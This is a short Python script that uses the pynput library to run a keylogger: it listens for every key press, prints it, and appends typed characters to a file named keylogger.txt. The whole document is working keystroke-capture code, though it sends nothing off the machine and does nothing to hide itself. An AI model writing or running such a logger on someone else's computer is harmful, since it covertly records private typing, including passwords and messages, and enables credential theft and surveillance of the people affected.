from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keylogger.txt", "a") as keylogger:
        try:
            char = key.char
            keylogger.write(char)
        except:
            print("Error")
if __name__ == '__main__':
    listener = keyboard.Listener(on_press = keypressed)
    listener.start()
    input()